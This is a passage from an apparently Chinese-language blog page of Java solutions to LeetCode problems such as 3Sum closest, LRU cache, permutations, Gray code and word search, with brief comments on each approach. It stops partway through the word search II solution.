<h3 id="16-最接近的三数之和"><a href="#16-最接近的三数之和" class="headerlink" title="16. 最接近的三数之和"></a><a href="https://leetcode-cn.com/problems/3sum-closest/">16. 最接近的三数之和</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 双指针</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">threeSumClosest</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> nums[<span class="number">0</span>] + nums[<span class="number">2</span>] + nums[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length - <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[l] + nums[r];</span><br><span class="line">                <span class="keyword">if</span> (Math.abs(sum - target) &lt; Math.abs(min - target)) &#123;</span><br><span class="line">                    min = sum;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">                    r--;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; target)&#123;</span><br><span class="line">                    ++l;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> min;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-58-I-翻转单词顺序"><a href="#剑指-Offer-58-I-翻转单词顺序" class="headerlink" title="剑指 Offer 58 - I. 翻转单词顺序"></a><a href="https://leetcode-cn.com/problems/fan-zhuan-dan-ci-shun-xu-lcof/">剑指 Offer 58 - I. 翻转单词顺序</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        String[] s1 = s.trim().split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> s1.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s1[i].equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">                sb.append(s1[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sb.append(s1[i]).append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-53-II-0～n-1中缺失的数字"><a href="#剑指-Offer-53-II-0～n-1中缺失的数字" class="headerlink" title="剑指 Offer 53 - II. 0～n-1中缺失的数字"></a><a href="https://leetcode-cn.com/problems/que-shi-de-shu-zi-lcof/">剑指 Offer 53 - II. 0～n-1中缺失的数字</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">missingNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>, right = nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] != mid) &#123;</span><br><span class="line">                right = mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">return</span> <span class="variable">left</span> <span class="operator">=</span>= nums.length - <span class="number">1</span> &amp;&amp; nums[left] == left ? nums.length : left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="448-找到所有数组中消失的数字"><a href="#448-找到所有数组中消失的数字" class="headerlink" title="448. 找到所有数组中消失的数字"></a><a href="https://leetcode-cn.com/problems/find-all-numbers-disappeared-in-an-array/">448. 找到所有数组中消失的数字</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//原地操作, 取余</span></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">findDisappearedNumbers</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> (num - <span class="number">1</span>) % n;</span><br><span class="line">            nums[x] += n;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= n) &#123;</span><br><span class="line">                res.add(i + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="415-字符串相加"><a href="#415-字符串相加" class="headerlink" title=" 415. 字符串相加"></a><a href="https://leetcode-cn.com/problems/add-strings"> 415. 字符串相加</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">addStrings</span><span class="params">(String num1, String num2)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] nc1 = num1.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] nc2 = num2.toCharArray();</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>, i = nc1.length - <span class="number">1</span>, j = nc2.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> || j &gt;= <span class="number">0</span> || carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                carry += nc1[i--] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                carry += nc2[j--] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(carry % <span class="number">10</span>);</span><br><span class="line">            carry /= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> sb.reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="31-下一个排列"><a href="#31-下一个排列" class="headerlink" title=" 31. 下一个排列"></a><a href="https://leetcode-cn.com/problems/next-permutation"> 31. 下一个排列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 从后往前, 找到第一次升序的两个数(下标为x,y, 然后将y-len这部分升序排序,</span></span><br><span class="line"><span class="comment">//从这个序列找到第一个比下标x大的数,然后交换即可</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">nextPermutation</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> nums.length - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 这里的不能是nums.length - 1</span></span><br><span class="line">            Arrays.sort(nums, i, nums.length);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &lt; nums.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &gt; nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> nums[i - <span class="number">1</span>];</span><br><span class="line">                    nums[i - <span class="number">1</span>] = nums[j];</span><br><span class="line">                    nums[j] = tmp;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] copy = Arrays.copyOf(nums, nums.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            nums[i] = copy[nums.length - i - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="165-比较版本号"><a href="#165-比较版本号" class="headerlink" title="165. 比较版本号"></a><a href="https://leetcode-cn.com/problems/compare-version-numbers">165. 比较版本号</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareVersion</span><span class="params">(String version1, String version2)</span> &#123;</span><br><span class="line">        <span class="comment">//\\会转义成反斜杠，反斜杠本身就是转义符，所有就成了“\.”，在进行转义就是.，所以\\.实际上是“.”。</span></span><br><span class="line">        String[] a1 = version1.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        String[] a2 = version2.split(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> Math.max(a1.length, a2.length);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; max; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> (i &lt; a1.length ? Integer.parseInt(a1[i]) : <span class="number">0</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> (i &lt; a2.length ? Integer.parseInt(a2[i]) : <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (a &lt; b) &#123;</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a &gt; b)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="169-多数元素"><a href="#169-多数元素" class="headerlink" title=" 169. 多数元素"></a><a href="https://leetcode-cn.com/problems/majority-element"> 169. 多数元素</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == min) &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                count--;</span><br><span class="line">                <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">                    min = nums[i];</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> min;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h2><h3 id="146-LRU-缓存机制-x2F"><a href="#146-LRU-缓存机制-x2F" class="headerlink" title="146. LRU 缓存机制&#x2F;"></a><a href="https://leetcode-cn.com/problems/lru-cache/">146. LRU 缓存机制</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 哈希表+双向链表</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LRUCache</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> capacity;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="keyword">private</span> Node head;</span><br><span class="line">    <span class="keyword">private</span> Node tail;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;Integer, Node&gt; map;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LRUCache</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.capacity = capacity;</span><br><span class="line">        <span class="built_in">this</span>.size = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.head = <span class="keyword">new</span> <span class="title class_">Node</span>(-<span class="number">1</span>, -<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">this</span>.tail = <span class="keyword">new</span> <span class="title class_">Node</span>(-<span class="number">1</span>, -<span class="number">1</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.pre  = head;</span><br><span class="line">        map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        moveToHead(node);</span><br><span class="line">        <span class="keyword">return</span> node.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">moveToHead</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        removeNode(node);</span><br><span class="line">        </span><br><span class="line">        addToHead(node);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> value)</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> map.get(key);</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Node</span> <span class="variable">node1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(key, value);</span><br><span class="line">            map.put(key, node1);</span><br><span class="line">            addToHead(node1);</span><br><span class="line">            size++;</span><br><span class="line">            <span class="keyword">if</span> (size &gt; capacity) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">node2</span> <span class="operator">=</span> removeTail();</span><br><span class="line">                map.remove(node2.key);</span><br><span class="line">                size--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            moveToHead(node);</span><br><span class="line">            node.val = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Node <span class="title function_">removeTail</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> tail.pre;</span><br><span class="line">        removeNode(node);</span><br><span class="line">        <span class="keyword">return</span> node;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">removeNode</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        node.pre.next = node.next;</span><br><span class="line">        node.next.pre = node.pre;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addToHead</span><span class="params">(Node node)</span> &#123;</span><br><span class="line">        node.next = head.next;</span><br><span class="line">        node.pre  = head;</span><br><span class="line">        head.next.pre = node;</span><br><span class="line">        head.next = node;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    <span class="type">int</span> key;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    Node pre, next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(<span class="type">int</span> key, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="回溯算法"><a href="#回溯算法" class="headerlink" title="回溯算法"></a>回溯算法</h2><h3 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a href="https://leetcode-cn.com/problems/permutations/">46. 全排列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">permute</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="type">boolean</span>[]  visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[nums.length];</span><br><span class="line">        dfs(nums, path, visited, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] nums, List&lt;Integer&gt; path, <span class="type">boolean</span>[] visited, List&lt;List&lt;Integer&gt;&gt; res)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (path.size() == nums.length) &#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visited[i]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            visited[i] = <span class="literal">true</span>;</span><br><span class="line">            path.add(nums[i]);</span><br><span class="line">            dfs(nums, path, visited, res);</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">            visited[i] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="78-子集"><a href="#78-子集" class="headerlink" title="78. 子集"></a><a href="https://leetcode-cn.com/problems/subsets/">78. 子集</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 回溯</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">subsets</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; path = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(<span class="number">0</span>, nums, path, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span>[] nums, List&lt;Integer&gt; path, List&lt;List&lt;Integer&gt;&gt; res)</span> &#123;</span><br><span class="line">        res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(path));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i; j &lt; nums.length; j++) &#123;</span><br><span class="line">            path.add(nums[j]);</span><br><span class="line">            dfs(j + <span class="number">1</span>, nums, path, res);</span><br><span class="line">            path.remove(path.size() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="89-格雷编码-x2F"><a href="#89-格雷编码-x2F" class="headerlink" title="89. 格雷编码&#x2F;"></a><a href="https://leetcode-cn.com/problems/gray-code/">89. 格雷编码</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 异或</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Integer&gt; <span class="title function_">grayCode</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">        关键是搞清楚格雷编码的生成过程, G(i) = i ^ (i/2);</span></span><br><span class="line"><span class="comment">        如 n = 3: </span></span><br><span class="line"><span class="comment">        G(0) = 000, </span></span><br><span class="line"><span class="comment">        G(1) = 1 ^ 0 = 001 ^ 000 = 001</span></span><br><span class="line"><span class="comment">        G(2) = 2 ^ 1 = 010 ^ 001 = 011 </span></span><br><span class="line"><span class="comment">        G(3) = 3 ^ 1 = 011 ^ 001 = 010</span></span><br><span class="line"><span class="comment">        G(4) = 4 ^ 2 = 100 ^ 010 = 110</span></span><br><span class="line"><span class="comment">        G(5) = 5 ^ 2 = 101 ^ 010 = 111</span></span><br><span class="line"><span class="comment">        G(6) = 6 ^ 3 = 110 ^ 011 = 101</span></span><br><span class="line"><span class="comment">        G(7) = 7 ^ 3 = 111 ^ 011 = 100</span></span><br><span class="line"><span class="comment">        **/</span></span><br><span class="line">        List&lt;Integer&gt; ret = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">1</span>&lt;&lt;n; ++i)</span><br><span class="line">            ret.add(i ^ i&gt;&gt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="79-单词搜索"><a href="#79-单词搜索" class="headerlink" title="79. 单词搜索"></a><a href="https://leetcode-cn.com/problems/word-search/">79. 单词搜索</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 把刚访问过的直接加256,然后在深度遍历</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dfs(board, word, i , j , <span class="number">0</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, String word, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> start)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start == word.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= board.length || j &lt; <span class="number">0</span> || j &gt;= board[<span class="number">0</span>].length || board[i][j] != word.charAt(start)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        board[i][j] += <span class="number">256</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> dfs(board, word ,i - <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i + <span class="number">1</span>, j, start + <span class="number">1</span>) || dfs(board, word ,i, j - <span class="number">1</span>, start + <span class="number">1</span>) || dfs(board, word ,i, j + <span class="number">1</span>, start + <span class="number">1</span>) ;</span><br><span class="line">        board[i][j] -= <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="212-单词搜索-II"><a href="#212-单词搜索-II" class="headerlink" title="212. 单词搜索 II"></a><a href="https://leetcode-cn.com/problems/word-search-ii/">212. 单词搜索 II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="comment">// 可以被构成的单词</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">findWords</span><span class="params">(<span class="type">char</span>[][] board, String[] words)</span> &#123;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 遍历每个单词,判断是否可以构成</span></span><br><span class="line">        <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">            <span class="keyword">if</span> (exist(board, word)) &#123;</span><br><span class="line">                res.add(word);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; board.length; i++) 